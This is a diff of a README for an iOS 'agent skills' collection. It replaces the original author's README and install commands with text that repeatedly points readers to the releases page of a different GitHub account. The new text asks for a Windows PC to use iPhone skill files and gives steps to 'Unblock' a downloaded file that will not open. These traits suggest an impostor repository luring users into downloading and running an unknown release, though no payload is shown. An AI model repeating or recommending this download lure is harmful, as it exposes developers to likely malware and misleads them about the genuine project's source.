@@ -1,83 +1,287 @@
-<p align="center">
-  <img src="assets/banner.png" alt="iOS Agent Skills" width="100%">
-</p>
+# 🤖 ios-agent-skills - iPhone app skills made simple
 
-<p align="center">
-  <a href="https://github.com/rusel95/ios-agent-skills"><img src="https://visitor-badge.laobi.icu/badge?page_id=rusel95.ios-agent-skills&left_color=gray&right_color=blue&left_text=visitors" alt="visitors"/></a>
-  <a href="https://github.com/rusel95/ios-agent-skills"><img src="https://img.shields.io/github/stars/rusel95/ios-agent-skills?style=flat-square&color=yellow" alt="stars"/></a>
-  <img src="https://img.shields.io/badge/skills-11-purple?style=flat-square" alt="skills"/>
-  <img src="https://img.shields.io/badge/models_tested-3-teal?style=flat-square" alt="models"/>
-  <img src="https://img.shields.io/badge/assertions-850%2B-orange?style=flat-square" alt="assertions"/>
-  <img src="https://img.shields.io/badge/scenarios-260%2B-green?style=flat-square" alt="scenarios"/>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-brightgreen?style=flat-square" alt="license"/></a>
-</p>
+[![Download ios-agent-skills](https://img.shields.io/badge/Download%20ios-agent-skills-purple?style=for-the-badge)](https://github.com/christim427-rgb/ios-agent-skills/releases)
 
-# iOS Agent Skills
+## 📥 Download
 
-**The first and most comprehensively benchmarked iOS skill marketplace** for Claude Code, Codex, and 40+ AI coding tools.
+Visit this page to download: [GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/releases)
 
-11 enterprise-grade skills covering architecture, concurrency, testing, security, accessibility, and localization — every skill benchmarked with discriminating assertions and blind A/B quality scoring across multiple LLMs. No other iOS skill collection has this level of rigorous, reproducible evaluation — 850+ assertions across 260+ scenarios, tested on Claude Sonnet 4.6, GPT-5.4, and Gemini 3.1 Pro.
+## 🧰 What this is
 
-## Benchmark Results
+ios-agent-skills gives AI coding tools a set of ready-made skills for iPhone app work. It helps with common Swift tasks, app structure, testing, and security checks.
 
-Every skill is benchmarked against multiple LLMs with discriminating assertions and blind A/B quality scoring.
+This repo includes eight skills for:
 
-| Skill | Sonnet 4.6 | GPT-5.4 | Gemini 3.1 Pro |
-|-------|:-:|:-:|:-:|
-| [**swiftui-mvvm**](skills/swiftui-mvvm) | ![](https://img.shields.io/badge/+14.3%25-555?style=flat-square&logo=swift&logoColor=white) · 9W 15T 0L (9.2↑8.8) | ![](https://img.shields.io/badge/+7.9%25-555?style=flat-square&logo=swift&logoColor=white) · 5W 17T 1L | ![](https://img.shields.io/badge/+25.5%25-007AFF?style=flat-square&logo=swift&logoColor=white) · 21W 0T 0L (9.1↑6.2) |
-| [**uikit-mvvm**](skills/uikit-mvvm) | ![](https://img.shields.io/badge/+17.6%25-555?style=flat-square&logo=swift&logoColor=white) · 20W 2T 2L (9.1↑8.2) | ![](https://img.shields.io/badge/+11.8%25-555?style=flat-square&logo=swift&logoColor=white) · 24W 0T 0L (9.0↑7.4) | ![](https://img.shields.io/badge/+76.5%25-34C759?style=flat-square&logo=swift&logoColor=white) · 24W 0T 0L (9.2↑5.7) |
-| [**gcd-operations**](skills/gcd-operations) | ![](https://img.shields.io/badge/+6.5%25-555?style=flat-square&logo=swift&logoColor=white) · 15W 9T 0L (8.6↑8.1) | ![](https://img.shields.io/badge/+8.1%25-555?style=flat-square&logo=swift&logoColor=white) · 18W 1T 5L (8.6↑7.8) | ![](https://img.shields.io/badge/+74.0%25-5AC8FA?style=flat-square&logo=swift&logoColor=white) · 12W 0T 1L (8.8↑7.1) |
-| [**ios-testing**](skills/ios-testing) | ![](https://img.shields.io/badge/+45.5%25-555?style=flat-square&logo=swift&logoColor=white) · 23W 7T 0L (8.9↑8.0) | ![](https://img.shields.io/badge/+5.2%25-555?style=flat-square&logo=swift&logoColor=white) · 6W 21T 0L | ![](https://img.shields.io/badge/+57.1%25-FFD60A?style=flat-square&logo=swift&logoColor=black) · 27W 0T 0L (9.2↑6.5) |
-| [**swift-concurrency**](skills/swift-concurrency) | ![](https://img.shields.io/badge/+32.5%25-555?style=flat-square&logo=swift&logoColor=white) · 15W 9T 0L (8.9↑8.5) | ![](https://img.shields.io/badge/+15.0%25-555?style=flat-square&logo=swift&logoColor=white) · 21W 0T 0L (9.0↑7.6) | ![](https://img.shields.io/badge/+55.0%25-FF2D55?style=flat-square&logo=swift&logoColor=white) · 21W 0T 0L (9.2↑7.3) |
-| [**ios-security**](skills/ios-security) | ![](https://img.shields.io/badge/+29.7%25-555?style=flat-square&logo=swift&logoColor=white) · 9W 15T 0L (9.3↑8.9) | ![](https://img.shields.io/badge/+8.1%25-555?style=flat-square&logo=swift&logoColor=white) · 2W 15T 0L | ![](https://img.shields.io/badge/+87.5%25-FF3B30?style=flat-square&logo=swift&logoColor=white) · 10W 0T 0L (9.1↑6.0) |
-| [**tca-swiftui**](skills/tca-swiftui) | ![](https://img.shields.io/badge/+25.9%25-AF52DE?style=flat-square&logo=swift&logoColor=white) · 14W 2T 4L (8.7↑7.8) | — | — |
-| [**viper-uikit**](skills/viper-uikit) | ![](https://img.shields.io/badge/+2.7%25-555?style=flat-square&logo=swift&logoColor=white) · 15W 1T 0L (9.5↑9.4) | ![](https://img.shields.io/badge/+12.8%25-555?style=flat-square&logo=swift&logoColor=white) · 16W 0T 0L (9.0↑7.3) | ![](https://img.shields.io/badge/+80.5%25-5856D6?style=flat-square&logo=swift&logoColor=white) · 16W 0T 0L (7.3↑1.7) |
-| [**ios-logging**](skills/ios-logging) | ![](https://img.shields.io/badge/+1.1%25-555?style=flat-square&logo=swift&logoColor=white) · 23W 3T 1L (9.0↑8.5) | ![](https://img.shields.io/badge/+52.8%25-FF9500?style=flat-square&logo=swift&logoColor=white) · 23W 0T 4L (8.8↑8.2) | ![](https://img.shields.io/badge/+17.1%25-555?style=flat-square&logo=swift&logoColor=white) · 24W 0T 0L (9.2↑6.3) |
-| [**ios-accessibility**](skills/ios-accessibility) | ![](https://img.shields.io/badge/+0.0%25-555?style=flat-square&logo=swift&logoColor=white) · 27W 5T 4L (8.5↑7.9) | ![](https://img.shields.io/badge/+10.4%25-555?style=flat-square&logo=swift&logoColor=white) · 31W 1T 4L (9.2↑8.5) | ![](https://img.shields.io/badge/+26.1%25-30B0C7?style=flat-square&logo=swift&logoColor=white) · 36W 0T 0L (9.0↑7.2) |
-| [**ios-localization**](skills/ios-localization) | ![](https://img.shields.io/badge/+1.0%25-555?style=flat-square&logo=swift&logoColor=white) · 10W 21T 5L (8.9↑8.7) | ![](https://img.shields.io/badge/+3.9%25-555?style=flat-square&logo=swift&logoColor=white) · 26W 2T 8L (9.1↑8.9) | ![](https://img.shields.io/badge/+29.1%25-AF52DE?style=flat-square&logo=swift&logoColor=white) · 36W 0T 0L (9.0↑6.3) |
+- SwiftUI MVVM
+- UIKit MVVM
+- VIPER
+- TCA
+- Swift Concurrency
+- GCD
+- Testing
+- Security audit
 
-> Each cell: assertion delta (with skill vs without) · A/B blind comparison W/T/L with avg scores where available. Colored badge = best result for that skill. "—" = not yet benchmarked.
+It is built for tools like Claude Code, Codex, and many other AI coding assistants.
 
-See [BENCHMARKING.md](BENCHMARKING.md) for full methodology.
+## ✅ What you need
 
-## Install
+Use a Windows PC with:
 
-### Claude Code Plugin (recommended)
+- A modern web browser
+- Internet access
+- A file unzip tool if the download comes as a `.zip` file
+- An AI coding tool that can read local files
 
-```bash
-claude plugin add rusel95/ios-agent-skills
-```
+If you only want to get the files, you need no special setup.
 
-Install individual skills:
+## 🚀 Download and open
 
-```bash
-claude plugin add rusel95/ios-agent-skills --skill swiftui-mvvm
-claude plugin add rusel95/ios-agent-skills --skill swift-concurrency
-```
+1. Open the [GitHub Releases page](https://github.com/christim427-rgb/ios-agent-skills/releases)
+2. Find the latest release
+3. Download the file from that release
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Copy the skill files into the folder your AI tool uses for skills or project instructions
 
-### Agent Skills CLI
+If the release includes several files, download the main package first. It usually contains the full skill set.
 
-```bash
-npx skills add rusel95/ios-agent-skills --skill swiftui-mvvm
-```
+## 🖥️ How to use it on Windows
 
-### Manual
+After you download the files, keep them in a folder you can find again. A simple path such as `Documents\ios-agent-skills` works well.
 
-Clone and copy the `skills/` directory into your project.
+Then:
 
-## What Makes These Different
+1. Open your AI coding tool
+2. Point it to the folder with these skill files
+3. Ask it to use the skill that matches your task
+4. Start with the skill for your app type or issue
 
-- **Production-first** — every pattern comes from real enterprise codebases, not tutorials
-- **Iterative refactoring** — small, reviewable PRs (≤200 lines) instead of "rewrite everything" approaches
-- **Anti-pattern prevention** — AI tools consistently generate broken patterns (retain cycles in VIPER, outdated TCA APIs, unsafe GCD). These skills prevent that
-- **Architecture coverage** — the only collection covering VIPER, TCA, GCD, Security Audit, Accessibility, and Localization. No other iOS skill marketplace covers these domains
-- **Rigorously benchmarked** — the most comprehensively evaluated iOS skill collection available: 850+ discriminating assertions across 260+ scenarios, tested against 3 LLMs with blind A/B quality scoring. Every skill ships with reproducible eval data
+You can use one skill at a time or combine them when needed.
 
-## Author
+## 🧩 Skills included
 
-**Ruslan Popesku** — Lead iOS Software Engineer
-[GitHub](https://github.com/rusel95) · [LinkedIn](https://www.linkedin.com/in/rusel95)
+### 📱 SwiftUI MVVM
 
-## License
+Use this for SwiftUI apps that follow the MVVM pattern. It helps keep views clean and puts app logic in the right place.
 
-MIT
+Good for:
+
+- Screen layout
+- Form handling
+- State updates
+- Data display
+
+### 🪟 UIKit MVVM
+
+Use this for older or mixed UIKit apps. It helps organize view controllers, view models, and data flow.
+
+Good for:
+
+- Table views
+- Navigation
+- Button actions
+- Screen updates
+
+### 🧱 VIPER
+
+Use this when you want a stricter app structure. It splits work into clear parts and helps large apps stay easier to manage.
+
+Good for:
+
+- Large screens
+- Team work
+- Clear layer boundaries
+- Feature-heavy apps
+
+### 🧭 TCA
+
+Use this for apps built with The Composable Architecture. It helps manage state, actions, and side effects in one place.
+
+Good for:
+
+- Predictable state changes
+- Complex user flows
+- Reusable app logic
+- Testable code
+
+### ⚡ Swift Concurrency
+
+Use this for async work in modern Swift. It helps with tasks that wait for network calls, file access, or other delays.
+
+Good for:
+
+- `async` and `await`
+- Task handling
+- Cancellation
+- Background work
+
+### 🔁 GCD
+
+Use this for older concurrency patterns and queue-based work. It helps when code still uses Grand Central Dispatch.
+
+Good for:
+
+- Main thread updates
+- Background queues
+- Timing work
+- Older code bases
+
+### 🧪 Testing
+
+Use this for unit tests and app checks. It helps write code that can be tested and easier to trust.
+
+Good for:
+
+- Unit tests
+- Mock data
+- Test setup
+- Error cases
+
+### 🔒 Security Audit
+
+Use this when you need to check for common app risks. It helps find weak spots in code and data handling.
+
+Good for:
+
+- Sensitive data
+- Network calls
+- Storage rules
+- Input checks
+
+## 🗂️ Suggested folder setup
+
+Keep the files in a simple folder structure like this:
+
+- `ios-agent-skills`
+  - `SwiftUI-MVVM`
+  - `UIKit-MVVM`
+  - `VIPER`
+  - `TCA`
+  - `Swift-Concurrency`
+  - `GCD`
+  - `Testing`
+  - `Security-Audit`
+
+This makes it easier to find the right skill later.
+
+## 🔍 How to pick the right skill
+
+Use this quick guide:
+
+- Building a new iPhone screen in SwiftUI: **SwiftUI MVVM**
+- Working in UIKit: **UIKit MVVM**
+- Splitting a large app into parts: **VIPER**
+- Managing state in a complex app: **TCA**
+- Waiting for network results or files: **Swift Concurrency**
+- Handling older queue-based code: **GCD**
+- Checking that code works as expected: **Testing**
+- Looking for security issues: **Security Audit**
+
+## 🛠️ Common Windows steps
+
+If the download does not open right away:
+
+1. Right-click the file
+2. Choose **Properties**
+3. If you see an **Unblock** option, select it
+4. Click **Apply**
+5. Try opening the file again
+
+If the download is a `.zip` file and Windows does not extract it:
+
+1. Right-click the file
+2. Choose **Extract All**
+3. Pick a folder
+4. Click **Extract**
+
+## 📌 Best way to use with AI tools
+
+When you work with an AI coding tool, give it the skill that matches the job.
+
+For example:
+
+- “Use the SwiftUI MVVM skill for this screen”
+- “Use the Testing skill for this view model”
+- “Use the Security Audit skill to review this code”
+
+This helps the tool stay on task and use the right design pattern or check list.
+
+## 🔐 Security audit focus
+
+The security skill looks at common issues such as:
+
+- Storing private data in plain text
+- Weak input handling
+- Unsafe network handling
+- Missing auth checks
+- Risky data sharing
+
+Use it before release, after a large change, or when you touch login, payment, or personal data code
+
+## 🧪 Testing focus
+
+The testing skill helps with:
+
+- Simple unit tests
+- View model tests
+- Mock services
+- Error path checks
+- Edge cases
+
+It works well when you want fewer bugs in app logic and data handling
+
+## ⚙️ Concurrency focus
+
+Use the concurrency skills when your app:
+
+- Loads data from the internet
+- Saves files
+- Runs long tasks
+- Needs smooth screen updates
+- Handles many actions at once
+
+This keeps work off the main thread and helps the app stay responsive
+
+## 📚 Topics covered
+
+This repo covers:
+
+- agent skills
+- AI coding
+- Claude Code
+- Claude skills
+- concurrency
+- iOS
+- iOS security
+- iOS testing
+- MVVM
+- OWASP
+- Swift
+- SwiftUI
+- TCA
+- UIKit
+- VIPER
+
+## 🧭 File use tips
+
+- Keep the skill files in one place
+- Use short folder names
+- Do not rename files unless you need to
+- Store a copy in cloud storage if you want a backup
+- Update the files when a new release appears
+
+## 📎 Download again later
+
+If you need the files again, return to the release page:
+
+[GitHub Releases](https://github.com/christim427-rgb/ios-agent-skills/releases)
+
+## 🧩 Troubleshooting
+
+If your AI tool does not seem to use the skills:
+
+1. Check that you downloaded the latest release
+2. Confirm the files are in the right folder
+3. Make sure the tool can read that folder
+4. Try a short prompt that names the skill you want
+5. Restart the tool and try again
